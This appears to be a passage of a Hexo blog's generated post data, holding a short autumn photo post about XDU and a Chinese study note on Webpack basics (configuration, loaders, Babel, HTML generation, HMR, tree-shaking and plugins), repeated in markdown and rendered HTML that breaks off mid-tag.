![在这里插入图片描述](https://img-blog.csdnimg.cn/20201028201708370.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201028201707987.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201028201707948.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n\n\n","source":"_posts/XDU-Autumn.md","raw":"---\ntitle: Autumn_XDU\ndate: 2021-08-09 00:00:46\ncategories: \n    - 日常\ntags: \n    - 日常\n    - 摄影\nmp3: \ncover: img/xdu.jpg\n---\n\n\n## XDU的秋天\n\n> 呜呜呜,XD的秋天也太好看了吧~~\n> ![在这里插入图片描述](https://img-blog.csdnimg.cn/20201028201708370.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201028201707987.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201028201707948.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n\n\n","slug":"XDU-Autumn","published":1,"updated":"2021-08-07T16:14:54.000Z","_id":"clg29vyhq004lao9chrvv7hcl","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"XDU的秋天\"><a href=\"#XDU的秋天\" class=\"headerlink\" title=\"XDU的秋天\"></a>XDU的秋天</h2><blockquote>\n<p>呜呜呜,XD的秋天也太好看了吧~~<br><img src=\"https://img-blog.csdnimg.cn/20201028201708370.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20201028201707987.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20201028201707948.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"XDU的秋天\"><a href=\"#XDU的秋天\" class=\"headerlink\" title=\"XDU的秋天\"></a>XDU的秋天</h2><blockquote>\n<p>呜呜呜,XD的秋天也太好看了吧~~<br><img src=\"https://img-blog.csdnimg.cn/20201028201708370.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20201028201707987.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/20201028201707948.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n</blockquote>\n"},{"title":"Vue笔记","date":"2022-11-11T18:51:45.000Z","mp3":null,"cover":"img/vue.png","_content":"\n# Webpack知识体系\n\n- 理解前端工程话概念、工具、目标；\n- 团队需要有人熟悉webpack；\n- 高阶前端必经之路；\n\n## 一、什么是webpack?\n\n### 1.前端项目构成 \n\n- 多媒体文件\n- CSS\n- JS\n- HTML\n- VUE\n\n##### 手动管理\n\n- 比如引入50个js文件，操作过程繁琐；\n- 当代码文件之间有依赖时，得严格依赖顺序书写；\n- 开发与生产环境一致，很呐接入TS或JS新特性；\n- 比较难接入Less、Sass等工具；\n- JS、图片、CSS资源管理模型不一致；\n\n### 2.常见工程化工具\n\n- Webpack\n- Vite\n- RollupJS\n\n### 3. Webpack\n\n##### 功能\n\n- 多份资源文件打包成Bundle；\n- 支持Babel、Eslint、TS、CoffeeScript、Less、Sass；\n- 支持模块化处理CSS、图片等资源文件；\n- 支持HMR+开发服务器；\n- 支持持续监听、持续构建；\n- 支持代码分离；\n- 支持Tree-shaking;\n- 支持Sourcemap；\n\n## 二、Webpack\n\n### 1.示例\n\n##### Setp1.安装webpack\n\n```shell\n\nnpm i -D webpack webpack-cli\n```\n\n##### Setp2.编辑配置文件 webpack.config.js\n\n```js\nconst path=require('path');\n\nmodule.exports={\n    entry:'./src/index',\t//定义当前项目的入口\n    mode:\"development\",\n    devtool:false,\n    output:{\n        filename:'[name].js',\t\t\t//定义打包后文件的名称；\n        path:path.join(_dirname,'./dist')\n    }\n}\n```\n\nStep3.执行编译命令\n\n```shell\nnpx webpack\n```\n\n> 打包到./dist/main.js\n\n### 2.核心流程\n\n- 入口处理：从entry文件开始，启动编译流程；\n- 以来解析：从entry开始，根据‘require’ or 'import' 等语句找到依赖资源；\n- 资源解析：更具‘module’配置，调用资源转移器，将png、css等非标准js资源转译为js内容；（如何实现？？）\n- 资源合并打包：将转译后的资源内容合并打包为可直接在浏览器运行的js文件；\n\n### 3.总结\n\n- 多文件资源合成一个，减少http请求；\n- 支持模块化开发；\n- 支持高级JS特性；\n- 支持TS，CofferScript；\n- ...\n\n## 三、使用Webpack--流程类\n\n![](https://s3.bmp.ovh/imgs/2023/02/08/3d52e90c95397aa0.jpg)\n\n### 1.配置文件\n\nWebpack的使用基本都围绕“配置”展开，而这些配置大致可以分为两类：\n\n- 流程类：作用于流程中的某个或多个环节，直接影响打包效果的配置项；\n\n![](https://s3.bmp.ovh/imgs/2023/02/08/175cc632cc5489e6.jpg)\n\n- 工具类：主流程之外，提供更多工程化能力的配置项；\n\n### 2.必须配置\n\n> 在一个项目配置里面，至少需要entry和output\n\n```js\nconst path=require('path');\n\nmodule.exports={\n    entry:'./src/index',\t//定义当前项目的入口\n    output:{\n        filename:'[name].js',\t\t\t//定义打包后文件的名称；\n        path:path.join(_dirname,'./dist')\n    }\n}\n```\n\n### 3.处理CSS\n\n- 安装loader\n\n```shell\nnpm add -D css-loader style-loader\n```\n\n- 添加module处理css文件\n\n```js\nconst path=require('path');\n\nmodule.exports={\n    entry:'./src/index',\t//定义当前项目的入口\n    output:{\n        filename:'[name].js',\t\t\t//定义打包后文件的名称；\n        path:path.join(_dirname,'./dist')\n    }，\n    module:{\n    \t//css处理器\n    \trules:[{\n            test:/\\.css$/,\t\t\t\t//css文件名过滤条件，满足即处理\n            use:[\t\t\t\t\t\t//使用怎样的loader去处理\n            \"style-loader\",\n            \"css-loader\"\n            ]\n        }]\n\t}\n}\n```\n\n- 引入\n\n```js\nconst styles=requrie(\"./index.css\");\n\nimport styles from './index.css';\n```\n\n##### loader有什么用？\n\n\n\n##### 与旧时代html中维护css相比，使用loader有什么优劣？\n\n\n\n##### 如何在webpack接入Less，Sass，Stylus等？\n\n\n\n### 4.接入Babel\n\n> 将ES6代码转译为ES5，向下兼容；\n\n- 安装依赖\n\n```shell\nnpm i -D @babel/core @babel/preset-env babel-loader\n```\n\n- 声明产物出口`output`\n\n```js\nconst path=require('path');\n\nmodule.exports={\n    entry:'./src/index',\t//定义当前项目的入口\n    output:{\n        filename:'[name].js',\t\t\t//定义打包后文件的名称；\n        path:path.join(_dirname,'./dist')\n    }，\n    module:{\n    \t//css处理器\n    \trules:[{\n           \t\ttest:/\\/js$/,\n    \t\t\tuser:[\n    \t\t\t\t\tloader:'babel-loader',\n    \t\t\t\t\toptions:{\n    \t\t\t\t\t\t\tpresets:[\n    \t\t\t\t\t\t\t['@babel/preset-env']\n                                ]\n                            }\n                     ]\n            ]\n        }]\n\t}\n}\n```\n\n- 执行`npx webpack`\n\n##### 问题\n\n- Babel具体由什么功能？\n- Babel与Webpack分别解决了什么问题？为何两者能协作到一块儿？\n\n### 5.生成HTML\n\n> 自动生成HTML文件；\n\n- 安装依赖\n\n```shell\nnpm i -D html-webpack-plugin\n```\n\n- 声明产物出口`output`\n\n```js\nconst path=require('path');\n\nmodule.exports={\n    entry:'./src/index',\t//定义当前项目的入口\n    output:{\n        filename:'[name].js',\t\t\t//定义打包后文件的名称；\n        path:path.join(_dirname,'./dist')\n    }，\n    plugins:[new HtmlWebpackPlugin()]\n};\n```\n\n- 执行`npx webpack`\n\n##### 问题\n\n- 相比于手工维护HTML内容，这张方式有什么优缺点？\n\n## 四、使用web pack--工具类\n\n### 1. HMR Hot Module Replacement\n\n> 模块热替换，写完的代码能立刻更新到页面；\n\n- 开启HMR\n\n  ```js\n  devServer:{\n  \thot:true,\n  \topen:true\n  },\n  module:{\n      \n  },\n  watch:true\n  ```\n\n- 启动Webpack\n\n```shell\nnpx webpack serve\n```\n\n### 2.Tree-shaking\n\n> 删除没有使用到的代码\n\n- Dead Code：代码没有被用到，不可到达；代码的执行结果不会被用到；代码只读不写；\n- Tree-shaking：模块导出了但是没被使用；\n\n```js\nmode:\"production\",\noptimization:{\nusedExports:true,\n}\n```\n\n## 五、其他工具\n\n- 缓存\n- Sourcemap\n- 性能监控\n- 日志\n- 代码压缩\n- 分包\n- ...\n\n## 六、理解Loader\n\n### 1.Webpack只认识JS\n\n> 为了处理非标准JS资源，设计出资源翻译模块---Loader\n>\n> 用于将资源翻译为标准JS\n\n### 2.使用loader\n\n- 安装依赖\n\n```shell\nnpm add -D css-loader style-loader less-loader\n```\n\n- 添加`module`处理css文件\n\n### 3.认识loader：链式调用\n\n- less-loader：将less=>css;\n- css-loader：将css包装成类似module.exports=\"${css}\"的内容，包装后的内容符合JS语法；\n- style-loader：将css模块包进require语句，并在运行时调用injectStyle等函数将内容注入到页面的style标签；\n\n![](https://s3.bmp.ovh/imgs/2023/02/08/d65b92e7cb18342c.jpg)\n\n### 4.loader特点\n\n- 链式执行；\n- 支持异步执行；\n- 分normal、patch两种模式；\n\n### 5.常见loader\n\n![](https://s3.bmp.ovh/imgs/2023/02/08/fe2e05bc32513a45.jpg)\n\n##### 问题\n\n- Loader是什么？要求的输出是什么？\n- Loader的链式调用是什么意思？如何串联多个loader？\n- Loader中如何处理异步场景？\n\n## 七、理解插件\n\n> 很多知名工具，如vscode、chrome、vue等都涉及了所谓的“插件架构“为什么？\n\n- 心智成本高=>可维护性低=>生命力弱\n- 插件架构精髓：对拓展开发，对修改封闭；\n- Webpack很多功能都是基于插件的概念实现；\n\n### 1.使用插件\n\n```js\n//引入插件\nconst DashboardPlugin=require('webpack-dashboard/plugin');\n\nmodule.exports={\n    //添加插件实例\n    plugins:[new DashboardPlugin()];\n};\n```\n\n### 2.编写插件\n\n##### 钩子\n\n```js\nclass SomePlugin{\n    apply(complier){\n        complier.hooks.thisCompilation.tap('SomePlugin',(compilation)=>{\n            \n        })\n    }\n}\n```\n\n- 时机：编译过程的特定节点，webpack会以钩子的形式通知插件此刻正在发生什么事；\n- 上下文：通过tapable提供的回调机制，以参数的方式传递上下文信息；\n- 交互：在上下文参数对象中附带了很多存在side effect 的交互接口，插件可以通过这些接口改变；\n\n##### 问题\n\n- Loader与插件有什么区同点？\n- 钩子有什么作用？如何监听钩子函数？\n\n## 八、学习方法\n\n\n\n![](https://s3.bmp.ovh/imgs/2023/02/08/979e56c5c207eac0.jpg)\n\n![](https://s3.bmp.ovh/imgs/2023/02/08/452e2397f71ff64e.jpg)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/Webpack体系.md","raw":"---\ntitle: Vue笔记\ndate: 2022-11-12 2:51:45\ncategories: \n    - 前端\ntags: \n    - VUE\n    - 笔记\nmp3: \ncover: img/vue.png\n---\n\n# Webpack知识体系\n\n- 理解前端工程话概念、工具、目标；\n- 团队需要有人熟悉webpack；\n- 高阶前端必经之路；\n\n## 一、什么是webpack?\n\n### 1.前端项目构成 \n\n- 多媒体文件\n- CSS\n- JS\n- HTML\n- VUE\n\n##### 手动管理\n\n- 比如引入50个js文件，操作过程繁琐；\n- 当代码文件之间有依赖时，得严格依赖顺序书写；\n- 开发与生产环境一致，很呐接入TS或JS新特性；\n- 比较难接入Less、Sass等工具；\n- JS、图片、CSS资源管理模型不一致；\n\n### 2.常见工程化工具\n\n- Webpack\n- Vite\n- RollupJS\n\n### 3. Webpack\n\n##### 功能\n\n- 多份资源文件打包成Bundle；\n- 支持Babel、Eslint、TS、CoffeeScript、Less、Sass；\n- 支持模块化处理CSS、图片等资源文件；\n- 支持HMR+开发服务器；\n- 支持持续监听、持续构建；\n- 支持代码分离；\n- 支持Tree-shaking;\n- 支持Sourcemap；\n\n## 二、Webpack\n\n### 1.示例\n\n##### Setp1.安装webpack\n\n```shell\n\nnpm i -D webpack webpack-cli\n```\n\n##### Setp2.编辑配置文件 webpack.config.js\n\n```js\nconst path=require('path');\n\nmodule.exports={\n    entry:'./src/index',\t//定义当前项目的入口\n    mode:\"development\",\n    devtool:false,\n    output:{\n        filename:'[name].js',\t\t\t//定义打包后文件的名称；\n        path:path.join(_dirname,'./dist')\n    }\n}\n```\n\nStep3.执行编译命令\n\n```shell\nnpx webpack\n```\n\n> 打包到./dist/main.js\n\n### 2.核心流程\n\n- 入口处理：从entry文件开始，启动编译流程；\n- 以来解析：从entry开始，根据‘require’ or 'import' 等语句找到依赖资源；\n- 资源解析：更具‘module’配置，调用资源转移器，将png、css等非标准js资源转译为js内容；（如何实现？？）\n- 资源合并打包：将转译后的资源内容合并打包为可直接在浏览器运行的js文件；\n\n### 3.总结\n\n- 多文件资源合成一个，减少http请求；\n- 支持模块化开发；\n- 支持高级JS特性；\n- 支持TS，CofferScript；\n- ...\n\n## 三、使用Webpack--流程类\n\n![](https://s3.bmp.ovh/imgs/2023/02/08/3d52e90c95397aa0.jpg)\n\n### 1.配置文件\n\nWebpack的使用基本都围绕“配置”展开，而这些配置大致可以分为两类：\n\n- 流程类：作用于流程中的某个或多个环节，直接影响打包效果的配置项；\n\n![](https://s3.bmp.ovh/imgs/2023/02/08/175cc632cc5489e6.jpg)\n\n- 工具类：主流程之外，提供更多工程化能力的配置项；\n\n### 2.必须配置\n\n> 在一个项目配置里面，至少需要entry和output\n\n```js\nconst path=require('path');\n\nmodule.exports={\n    entry:'./src/index',\t//定义当前项目的入口\n    output:{\n        filename:'[name].js',\t\t\t//定义打包后文件的名称；\n        path:path.join(_dirname,'./dist')\n    }\n}\n```\n\n### 3.处理CSS\n\n- 安装loader\n\n```shell\nnpm add -D css-loader style-loader\n```\n\n- 添加module处理css文件\n\n```js\nconst path=require('path');\n\nmodule.exports={\n    entry:'./src/index',\t//定义当前项目的入口\n    output:{\n        filename:'[name].js',\t\t\t//定义打包后文件的名称；\n        path:path.join(_dirname,'./dist')\n    }，\n    module:{\n    \t//css处理器\n    \trules:[{\n            test:/\\.css$/,\t\t\t\t//css文件名过滤条件，满足即处理\n            use:[\t\t\t\t\t\t//使用怎样的loader去处理\n            \"style-loader\",\n            \"css-loader\"\n            ]\n        }]\n\t}\n}\n```\n\n- 引入\n\n```js\nconst styles=requrie(\"./index.css\");\n\nimport styles from './index.css';\n```\n\n##### loader有什么用？\n\n\n\n##### 与旧时代html中维护css相比，使用loader有什么优劣？\n\n\n\n##### 如何在webpack接入Less，Sass，Stylus等？\n\n\n\n### 4.接入Babel\n\n> 将ES6代码转译为ES5，向下兼容；\n\n- 安装依赖\n\n```shell\nnpm i -D @babel/core @babel/preset-env babel-loader\n```\n\n- 声明产物出口`output`\n\n```js\nconst path=require('path');\n\nmodule.exports={\n    entry:'./src/index',\t//定义当前项目的入口\n    output:{\n        filename:'[name].js',\t\t\t//定义打包后文件的名称；\n        path:path.join(_dirname,'./dist')\n    }，\n    module:{\n    \t//css处理器\n    \trules:[{\n           \t\ttest:/\\/js$/,\n    \t\t\tuser:[\n    \t\t\t\t\tloader:'babel-loader',\n    \t\t\t\t\toptions:{\n    \t\t\t\t\t\t\tpresets:[\n    \t\t\t\t\t\t\t['@babel/preset-env']\n                                ]\n                            }\n                     ]\n            ]\n        }]\n\t}\n}\n```\n\n- 执行`npx webpack`\n\n##### 问题\n\n- Babel具体由什么功能？\n- Babel与Webpack分别解决了什么问题？为何两者能协作到一块儿？\n\n### 5.生成HTML\n\n> 自动生成HTML文件；\n\n- 安装依赖\n\n```shell\nnpm i -D html-webpack-plugin\n```\n\n- 声明产物出口`output`\n\n```js\nconst path=require('path');\n\nmodule.exports={\n    entry:'./src/index',\t//定义当前项目的入口\n    output:{\n        filename:'[name].js',\t\t\t//定义打包后文件的名称；\n        path:path.join(_dirname,'./dist')\n    }，\n    plugins:[new HtmlWebpackPlugin()]\n};\n```\n\n- 执行`npx webpack`\n\n##### 问题\n\n- 相比于手工维护HTML内容，这张方式有什么优缺点？\n\n## 四、使用web pack--工具类\n\n### 1. HMR Hot Module Replacement\n\n> 模块热替换，写完的代码能立刻更新到页面；\n\n- 开启HMR\n\n  ```js\n  devServer:{\n  \thot:true,\n  \topen:true\n  },\n  module:{\n      \n  },\n  watch:true\n  ```\n\n- 启动Webpack\n\n```shell\nnpx webpack serve\n```\n\n### 2.Tree-shaking\n\n> 删除没有使用到的代码\n\n- Dead Code：代码没有被用到，不可到达；代码的执行结果不会被用到；代码只读不写；\n- Tree-shaking：模块导出了但是没被使用；\n\n```js\nmode:\"production\",\noptimization:{\nusedExports:true,\n}\n```\n\n## 五、其他工具\n\n- 缓存\n- Sourcemap\n- 性能监控\n- 日志\n- 代码压缩\n- 分包\n- ...\n\n## 六、理解Loader\n\n### 1.Webpack只认识JS\n\n> 为了处理非标准JS资源，设计出资源翻译模块---Loader\n>\n> 用于将资源翻译为标准JS\n\n### 2.使用loader\n\n- 安装依赖\n\n```shell\nnpm add -D css-loader style-loader less-loader\n```\n\n- 添加`module`处理css文件\n\n### 3.认识loader：链式调用\n\n- less-loader：将less=>css;\n- css-loader：将css包装成类似module.exports=\"${css}\"的内容，包装后的内容符合JS语法；\n- style-loader：将css模块包进require语句，并在运行时调用injectStyle等函数将内容注入到页面的style标签；\n\n![](https://s3.bmp.ovh/imgs/2023/02/08/d65b92e7cb18342c.jpg)\n\n### 4.loader特点\n\n- 链式执行；\n- 支持异步执行；\n- 分normal、patch两种模式；\n\n### 5.常见loader\n\n![](https://s3.bmp.ovh/imgs/2023/02/08/fe2e05bc32513a45.jpg)\n\n##### 问题\n\n- Loader是什么？要求的输出是什么？\n- Loader的链式调用是什么意思？如何串联多个loader？\n- Loader中如何处理异步场景？\n\n## 七、理解插件\n\n> 很多知名工具，如vscode、chrome、vue等都涉及了所谓的“插件架构“为什么？\n\n- 心智成本高=>可维护性低=>生命力弱\n- 插件架构精髓：对拓展开发，对修改封闭；\n- Webpack很多功能都是基于插件的概念实现；\n\n### 1.使用插件\n\n```js\n//引入插件\nconst DashboardPlugin=require('webpack-dashboard/plugin');\n\nmodule.exports={\n    //添加插件实例\n    plugins:[new DashboardPlugin()];\n};\n```\n\n### 2.编写插件\n\n##### 钩子\n\n```js\nclass SomePlugin{\n    apply(complier){\n        complier.hooks.thisCompilation.tap('SomePlugin',(compilation)=>{\n            \n        })\n    }\n}\n```\n\n- 时机：编译过程的特定节点，webpack会以钩子的形式通知插件此刻正在发生什么事；\n- 上下文：通过tapable提供的回调机制，以参数的方式传递上下文信息；\n- 交互：在上下文参数对象中附带了很多存在side effect 的交互接口，插件可以通过这些接口改变；\n\n##### 问题\n\n- Loader与插件有什么区同点？\n- 钩子有什么作用？如何监听钩子函数？\n\n## 八、学习方法\n\n\n\n![](https://s3.bmp.ovh/imgs/2023/02/08/979e56c5c207eac0.jpg)\n\n![](https://s3.bmp.ovh/imgs/2023/02/08/452e2397f71ff64e.jpg)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"Webpack体系","published":1,"updated":"2023-04-04T13:34:57.918Z","_id":"clg29vyhr004pao9cd3s4cn14","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Webpack知识体系\"><a href=\"#Webpack知识体系\" class=\"headerlink\" title=\"Webpack知识体系\"></a>Webpack知识体系</h1><ul>\n<li>理解前端工程话概念、工具、目标；</li>\n<li>团队需要有人熟悉webpack；</li>\n<li>高阶前端必经之路；</li>\n</ul>\n<h2 id=\"一、什么是webpack\"><a href=\"#一、什么是webpack\" class=\"headerlink\" title=\"一、什么是webpack?\"></a>一、什么是webpack?</h2><h3 id=\"1-前端项目构成\"><a href=\"#1-前端项目构成\" class=\"headerlink\" title=\"1.前端项目构成\"></a>1.前端项目构成</h3><ul>\n<li>多媒体文件</li>\n<li>CSS</li>\n<li>JS</li>\n<li>HTML</li>\n<li>VUE</li>\n</ul>\n<h5 id=\"手动管理\"><a href=\"#手动管理\" class=\"headerlink\" title=\"手动管理\"></a>手动管理</h5><ul>\n<li>比如引入50个js文件，操作过程繁琐；</li>\n<li>当代码文件之间有依赖时，得严格依赖顺序书写；</li>\n<li>开发与生产环境一致，很呐接入TS或JS新特性；</li>\n<li>比较难接入Less、Sass等工具；</li>\n<li>JS、图片、CSS资源管理模型不一致；</li>\n</ul>\n<h3 id=\"2-常见工程化工具\"><a href=\"#2-常见工程化工具\" class=\"headerlink\" title=\"2.常见工程化工具\"></a>2.常见工程化工具</h3><ul>\n<li>Webpack</li>\n<li>Vite</li>\n<li>RollupJS</li>\n</ul>\n<h3 id=\"3-Webpack\"><a href=\"#3-Webpack\" class=\"headerlink\" title=\"3. Webpack\"></a>3. Webpack</h3><h5 id=\"功能\"><a href=\"#功能\" class=\"headerlink\" title=\"功能\"></a>功能</h5><ul>\n<li>多份资源文件打包成Bundle；</li>\n<li>支持Babel、Eslint、TS、CoffeeScript、Less、Sass；</li>\n<li>支持模块化处理CSS、图片等资源文件；</li>\n<li>支持HMR+开发服务器；</li>\n<li>支持持续监听、持续构建；</li>\n<li>支持代码分离；</li>\n<li>支持Tree-shaking;</li>\n<li>支持Sourcemap；</li>\n</ul>\n<h2 id=\"二、Webpack\"><a href=\"#二、Webpack\" class=\"headerlink\" title=\"二、Webpack\"></a>二、Webpack</h2><h3 id=\"1-示例\"><a href=\"#1-示例\" class=\"headerlink\" title=\"1.示例\"></a>1.示例</h3><h5 id=\"Setp1-安装webpack\"><a href=\"#Setp1-安装webpack\" class=\"headerlink\" title=\"Setp1.安装webpack\"></a>Setp1.安装webpack</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\"><br>npm i -D webpack webpack-cli<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"Setp2-编辑配置文件-webpack-config-js\"><a href=\"#Setp2-编辑配置文件-webpack-config-js\" class=\"headerlink\" title=\"Setp2.编辑配置文件 webpack.config.js\"></a>Setp2.编辑配置文件 webpack.config.js</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> path=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;path&#x27;</span>);<br><br><span class=\"hljs-variable language_\">module</span>.<span class=\"hljs-property\">exports</span>=&#123;<br>    <span class=\"hljs-attr\">entry</span>:<span class=\"hljs-string\">&#x27;./src/index&#x27;</span>,\t<span class=\"hljs-comment\">//定义当前项目的入口</span><br>    <span class=\"hljs-attr\">mode</span>:<span class=\"hljs-string\">&quot;development&quot;</span>,<br>    <span class=\"hljs-attr\">devtool</span>:<span class=\"hljs-literal\">false</span>,<br>    <span class=\"hljs-attr\">output</span>:&#123;<br>        <span class=\"hljs-attr\">filename</span>:<span class=\"hljs-string\">&#x27;[name].js&#x27;</span>,\t\t\t<span class=\"hljs-comment\">//定义打包后文件的名称；</span><br>        <span class=\"hljs-attr\">path</span>:path.<span class=\"hljs-title function_\">join</span>(_dirname,<span class=\"hljs-string\">&#x27;./dist&#x27;</span>)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>Step3.执行编译命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">npx webpack<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>打包到./dist/main.js</p>\n</blockquote>\n<h3 id=\"2-核心流程\"><a href=\"#2-核心流程\" class=\"headerlink\" title=\"2.核心流程\"></a>2.核心流程</h3><ul>\n<li>入口处理：从entry文件开始，启动编译流程；</li>\n<li>以来解析：从entry开始，根据‘require’ or ‘import’ 等语句找到依赖资源；</li>\n<li>资源解析：更具‘module’配置，调用资源转移器，将png、css等非标准js资源转译为js内容；（如何实现？？）</li>\n<li>资源合并打包：将转译后的资源内容合并打包为可直接在浏览器运行的js文件；</li>\n</ul>\n<h3 id=\"3-总结\"><a href=\"#3-总结\" class=\"headerlink\" title=\"3.总结\"></a>3.总结</h3><ul>\n<li>多文件资源合成一个，减少http请求；</li>\n<li>支持模块化开发；</li>\n<li>支持高级JS特性；</li>\n<li>支持TS，CofferScript；</li>\n<li>…</li>\n</ul>\n<h2 id=\"三、使用Webpack–流程类\"><a href=\"#三、使用Webpack–流程类\" class=\"headerlink\" title=\"三、使用Webpack–流程类\"></a>三、使用Webpack–流程类</h2><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/08/3d52e90c95397aa0.jpg\"></p>\n<h3 id=\"1-配置文件\"><a href=\"#1-配置文件\" class=\"headerlink\" title=\"1.配置文件\"></a>1.配置文件</h3><p>Webpack的使用基本都围绕“配置”展开，而这些配置大致可以分为两类：</p>\n<ul>\n<li>流程类：作用于流程中的某个或多个环节，直接影响打包效果的配置项；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/08/175cc632cc5489e6.jpg\"></p>\n<ul>\n<li>工具类：主流程之外，提供更多工程化能力的配置项；</li>\n</ul>\n<h3 id=\"2-必须配置\"><a href=\"#2-必须配置\" class=\"headerlink\" title=\"2.必须配置\"></a>2.必须配置</h3><blockquote>\n<p>在一个项目配置里面，至少需要entry和output</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> path=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;path&#x27;</span>);<br><br><span class=\"hljs-variable language_\">module</span>.<span class=\"hljs-property\">exports</span>=&#123;<br>    <span class=\"hljs-attr\">entry</span>:<span class=\"hljs-string\">&#x27;./src/index&#x27;</span>,\t<span class=\"hljs-comment\">//定义当前项目的入口</span><br>    <span class=\"hljs-attr\">output</span>:&#123;<br>        <span class=\"hljs-attr\">filename</span>:<span class=\"hljs-string\">&#x27;[name].js&#x27;</span>,\t\t\t<span class=\"hljs-comment\">//定义打包后文件的名称；</span><br>        <span class=\"hljs-attr\">path</span>:path.<span class=\"hljs-title function_\">join</span>(_dirname,<span class=\"hljs-string\">&#x27;./dist&#x27;</span>)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-处理CSS\"><a href=\"#3-处理CSS\" class=\"headerlink\" title=\"3.处理CSS\"></a>3.处理CSS</h3><ul>\n<li>安装loader</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">npm add -D css-loader style-loader<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>添加module处理css文件</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span 